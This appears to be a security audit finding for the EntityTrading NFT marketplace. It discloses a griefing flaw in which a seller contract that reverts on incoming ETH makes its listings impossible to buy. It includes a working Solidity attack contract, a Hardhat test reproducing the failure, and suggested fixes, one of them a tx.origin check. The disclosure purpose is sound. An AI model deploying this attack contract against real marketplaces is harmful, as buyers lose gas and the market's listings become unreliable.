# Vulnerability details

## Impact

A malicious actor can create unfillable listings on the marketplace by using a contract that reverts upon receiving ETH. When buyers attempt to complete these listings using the `EntityTrading.buyNFT()` function, the transactions will fail, resulting in wasted gas fees and potential financial losses for the buyers.

If unfillable orders become widespread, they could significantly undermine user confidence in the marketplace and the protocol. Users may perceive the platform as unreliable, leading to decreased activity and a potential loss of both buyers and sellers.

## Proof of Concept

The following contract demonstrates how a malicious actor can create unfillable listings by reverting any ETH transfer:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

contract MaliciousSeller {
  address public nft;
  address public entityTrading;

  constructor(address _nft, address _entityTrading) {
    nft = _nft;
    entityTrading = _entityTrading;
  }

  receive() external payable {
    revert('reverting on all incoming ether');
  }

  function list(uint256 tokenId, uint256 price) public {
    (, bytes memory data) = nft.call(
      abi.encodeWithSignature(
        'approve(address,uint256)',
        entityTrading,
        tokenId
      )
    );

    (bool success, ) = entityTrading.call(
      abi.encodeWithSignature('listNFTForSale(uint256,uint256)', tokenId, price)
    );
  }
}
```

Since the `MaliciousSeller` contract reverts upon receiving ETH, any attempt to purchase listings created by this contract will fail due to the following line in the `buyNFT()` function:

```solidity
(bool success, ) = payable(listing.seller).call{ value: sellerProceeds }("");
require(success, "Failed to send to seller");
```

### Hardhat Test Case

The following Hardhat test case demonstrates the failure when attempting to buy an NFT from the malicious seller:

```javascript
import { ethers } from 'hardhat';
import { EntityTrading, MaliciousSeller, TestERC721 } from '../typechain-types';
import { HardhatEthersSigner } from '@nomicfoundation/hardhat-ethers/signers';
import { expect } from 'chai';

// Define some constants for testing
const TOKEN_ID = 0;
const LISTING_PRICE = ethers.parseEther('1.0');

describe('UnfillableOrderPoc', function () {
  let buyer: HardhatEthersSigner;
  let nukeFund: HardhatEthersSigner;
  let nft: TestERC721;
  let entityTrading: EntityTrading;
  let maliciousSeller: MaliciousSeller;

  it('poc for unfillable order', async function () {
    [buyer, nukeFund] = await ethers.getSigners();

    nft = await ethers.deployContract('TestERC721');
    entityTrading = await ethers.deployContract('EntityTrading', [
      await nft.getAddress(),
    ]);

    // Set NukeFund address
    await entityTrading.setNukeFundAddress(nukeFund.address);

    // set up malicious seller
    maliciousSeller = await ethers.deployContract('MaliciousSeller', [
      await nft.getAddress(),
      await entityTrading.getAddress(),
    ]);

    // Mint and approve the NFT for trading
    await nft.mintToken(await maliciousSeller.getAddress());

    await maliciousSeller.list(TOKEN_ID, LISTING_PRICE);

    const listingId = await entityTrading.listedTokenIds(TOKEN_ID);
    const listing = await entityTrading.listings(listingId);

    // listing is valid
    expect(listing.seller).to.equal(await maliciousSeller.getAddress());
    expect(listing.price).to.equal(LISTING_PRICE);
    expect(listing.isActive).to.be.true;

    // reverts because the malicious seller's contract reverts upon receiving funds
    await entityTrading
      .connect(buyer)
      .buyNFT(TOKEN_ID, { value: LISTING_PRICE });
  });
});
```

## Recommended Mitigation Steps

To prevent malicious actors from creating unfillable listings, consider implementing one of the following solutions:

1. **Disallow Listings from Smart Contracts:**
   Add a check to the `listNFTForSale()` function to ensure that only externally owned accounts (EOAs) can list NFTs for sale. This can be done using the `tx.origin` property:

   ```diff
   diff --git a/contracts/EntityTrading/EntityTrading.sol b/contracts/EntityTrading/EntityTrading.sol
   index 57a6b07..b061872 100644
   --- a/contracts/EntityTrading/EntityTrading.sol
   +++ b/contracts/EntityTrading/EntityTrading.sol
   @@ -49,6 +49,7 @@ contract EntityTrading is IEntityTrading, ReentrancyGuard, Ownable, Pausable {
           nftContract.isApprovedForAll(msg.sender, address(this)),
         'Contract must be approved to transfer the NFT.'
       );
   +    require(msg.sender == tx.origin, "Caller cannot be a smart contract");

       nftContract.transferFrom(msg.sender, address(this), tokenId); // transfer NFT to contract
   ```

2. **Escrow ETH Temporarily:**
   If smart contract listings are necessary, modify the protocol to escrow ETH temporarily within a protocol-controlled smart contract, allowing buyers to complete transactions without directly interacting with potentially malicious contracts. This approach involves storing ETH within a trusted contract until the transaction's finality can be confirmed.

Implementing these steps will help ensure that the marketplace remains robust and user-friendly, mitigating the risks associated with malicious listings and preserving user confidence.
